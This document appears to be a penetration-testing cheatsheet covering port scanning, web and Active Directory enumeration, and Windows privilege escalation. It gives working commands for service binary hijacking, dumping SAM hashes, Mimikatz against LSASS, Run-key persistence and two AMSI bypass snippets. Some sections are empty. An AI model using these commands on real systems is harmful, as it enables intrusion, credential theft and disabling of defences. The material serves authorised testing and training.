## 1. Scan for Services

> Goal: map the attack surface before touching anything.

```bash
# Full port scan + service version detection
nmap -sC -sV -p- -oA scan_full <TARGET>

# Fast top-1000 first pass
nmap -sC -sV -oA scan_quick <TARGET>

# UDP scan (common: 53, 161, 500)
nmap -sU --top-ports 200 -oA scan_udp <TARGET>
```

## 2. Exploit Services for Foothold

### 2a. Web Services

#### Enumerate Files & Directories

```bash
# gobuster
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# feroxbuster (recursive)
feroxbuster -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# ffuf
ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

#### Enumerate Virtual Hosts

```bash
gobuster vhost -u http://<TARGET> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
ffuf -u http://<TARGET> -H "Host: FUZZ.<DOMAIN>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <SIZE>
```

#### Check for Known CVEs

```bash
# Identify tech stack first
whatweb http://<TARGET>
nikto -h http://<TARGET>

# Search exploits
searchsploit <SERVICE> <VERSION>
```

#### Check for Custom Web Vulnerabilities

> See **Web Exploitation Series** for full coverage.

- [ ] SQLi — login forms, search, URL params
- [ ] XSS — reflected, stored, DOM
- [ ] LFI / RFI — file inclusion in URL params
- [ ] SSTI — template injection in user input
- [ ] IDOR — access control on object IDs
- [ ] Command injection — ping, lookup, export functions
- [ ] File upload bypass — shell upload via image/extension tricks
- [ ] Broken auth — default creds, weak session tokens

### 2b. Non-Web Services (Active Directory)

> See **Active Directory Series** for full coverage.

#### Enumerate Entry Points

```bash
# SMB
nmap --script smb-enum-shares,smb-enum-users -p 445 <TARGET>
smbclient -L //<TARGET> -N
enum4linux -a <TARGET>

# LDAP
ldapsearch -x -H ldap://<TARGET> -b "DC=domain,DC=local"

# Kerberos
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt
```

#### Check for Common Misconfigurations

- [ ] Anonymous SMB / LDAP access
- [ ] AS-REP Roasting (no pre-auth required)
- [ ] Kerberoasting (SPNs set on user accounts)
- [ ] Password spraying with common passwords
- [ ] Null sessions

#### Check for Known CVEs

```bash
searchsploit <SERVICE> <VERSION>
# Notable: EternalBlue (MS17-010), PrintNightmare, ZeroLogon
nmap --script smb-vuln* -p 445 <TARGET>
```

#### Check for Custom Vulnerabilities

- [ ] Weak ACLs on AD objects (BloodHound)
- [ ] Unconstrained / constrained delegation
- [ ] DCSync rights on non-DC accounts
- [ ] WriteDACL / GenericAll permissions

## 3. Privilege Escalation

> Starting point: interactive shell on the system.

```
whoami /all   ← always run this first
systeminfo    ← OS version, patches
```

---

### 3.1 Enumerate Users, Groups & Privileges

```powershell
whoami
whoami /groups
whoami /priv
net user
net user <USERNAME>
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
```

#### ⚠️ Check for Dangerous Privileges

| Privilege | Exploit Path |
|-----------|-------------|
| `SeImpersonatePrivilege` | PrintSpoofer / GodPotato → SYSTEM |
| `SeBackupPrivilege` | Dump SAM + SYSTEM hives |
| `SeDebugPrivilege` | Inject into LSASS → dump hashes |
| `SeTakeOwnershipPrivilege` | Take ownership of any file |

> See: [[Windows_PrivEsc_Cheatsheet#6. SeImpersonatePrivilege]] | [[Windows_PrivEsc_Cheatsheet#7. SeBackupPrivilege]]

---

### 3.2 Enumerate Installed Applications

```powershell
# 32-bit
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 64-bit
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-Process
```

- [ ] Check versions against known CVEs (`searchsploit`, NVD)

---

### 3.3 Enumerate Services

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
sc.exe query
.\winPEAS.exe quiet servicesinfo
```

#### Check for Known CVEs

```bash
searchsploit <SERVICE NAME> <VERSION>
```

#### Check for Weak Service Permissions

```powershell
# Can we modify the binary path?
sc.exe sdshow <SERVICE>
.\accesschk.exe /accepteula -uwcqv <USERNAME> *

# If writable → swap binary
sc.exe config <SERVICE> binPath="C:\path\malicious.exe"
sc.exe stop  <SERVICE>
sc.exe start <SERVICE>
```

#### Check for Unquoted Service Paths

```powershell
# Find unquoted paths with spaces
Get-CimInstance -ClassName win32_service | Select Name,PathName | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' }
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
```

> [!tip] Place malicious exe in the highest-priority unquoted segment. e.g. `C:\Program.exe` for path `C:\Program Files\App\svc.exe`

#### Check for DLL Hijacking

```powershell
.\Listdlls64.exe /accepteula <SERVICE>
# Look for DLLs loaded from user-writable paths
```

> Search Order: lpFileName → System32 → 16-bit sys → Windows dir → CWD → PATH  
> See: [[Windows_PrivEsc_Cheatsheet#11. DLL Hijacking]]

---

### 3.4 Enumerate Files in Accessible Directories

```powershell
# Search for sensitive file types
Get-ChildItem -Path C:\Users\ -Include *.kdbx,*.txt,*.xml,*.config,*.ini,*.bak -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.conf,*.config,*.cfg,*.env -File -Recurse -ErrorAction SilentlyContinue
```

#### SAM + SYSTEM (requires SeBackupPrivilege or SYSTEM)

```cmd
reg save hklm\sam    C:\temp\SAM.hive
reg save hklm\system C:\temp\SYSTEM.hive
```

```bash
# Offline — extract hashes on attacker
secretsdump.py -sam SAM.hive -system SYSTEM.hive LOCAL
```

#### PowerShell History

```powershell
(Get-PSReadlineOption).HistorySavePath
# Default path:
type %UserProfile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Interesting File Targets

| Category | Look For |
|----------|----------|
| Config files | `web.config`, `appsettings.json`, `.env`, `php.ini` |
| Credentials | `id_rsa`, `*.pem`, `*.pfx`, `*.kdbx` (KeePass) |
| Backups | `*.bak`, `*.old`, `*.zip` in web roots |
| Scripts | `*.ps1`, `*.bat`, `*.vbs` with hardcoded creds |

### 3.6 Always Install Elevated



```cmd

```

### 3.7 UAC Bypass (Low Integrity → High Integrity)

> Condition: user is in Administrators group but running at medium integrity.

```powershell
# Check UAC status
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Select-Object ConsentPromptBehaviorAdmin
```

| UAC Level | Bypass Method |
|-----------|--------------|
| 0 | `Start-Process -Verb RunAs` |
| 1–4 | AlwaysInstallElevated MSI |
| 5 | `ms-settings` registry hijack (fodhelper) |

> See: [[Windows_PrivEsc_Cheatsheet#13. UAC Bypass]]

### 3.9 Capture Net-NTLM Hash with Responder

> Use when you need the NTLM hash of the current user (e.g., for relay or cracking).


### 3.12 AMSI Bypass (if AV is active)

> Run before loading any offensive PowerShell scripts.

```powershell
# Bypass #1 — zero out AmsiContext
$fields=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static')
$amsiContext=$fields | Where-Object { $_ -like "*Context" }
[IntPtr]$ptr=$amsiContext.GetValue($null)
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Bypass #2 — set amsiInitFailed
$f=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static') | Where-Object { $_.Name -like "amsiInitFailed" }
$f.SetValue($null, $true)
```

> See: [[Windows_PrivEsc_Cheatsheet#18. AMSI Bypass]]

## Quick Reference — Decision Tree

```
whoami /priv
  ├── SeImpersonatePrivilege  → PrintSpoofer / GodPotato
  ├── SeBackupPrivilege       → Dump SAM + SYSTEM
  └── SeDebugPrivilege        → Mimikatz inject LSASS

whoami /groups
  └── Administrators (medium integrity)
        └── UAC level?
              ├── 0     → Start-Process -Verb RunAs
              ├── 1–4   → AlwaysInstallElevated MSI
              └── 5     → ms-settings registry hijack

Services
  ├── Weak permissions    → swap binPath
  ├── Unquoted path       → plant exe in gap
  └── DLL hijacking       → drop malicious DLL

Files
  ├── SAM + SYSTEM        → secretsdump
  ├── PS history          → grep for creds
  └── Config files        → grep for passwords

Registry
  ├── AlwaysInstallElevated → MSI payload
  ├── Run keys (writable)   → persistence
  └── AppInit_DLLs          → DLL injection
```
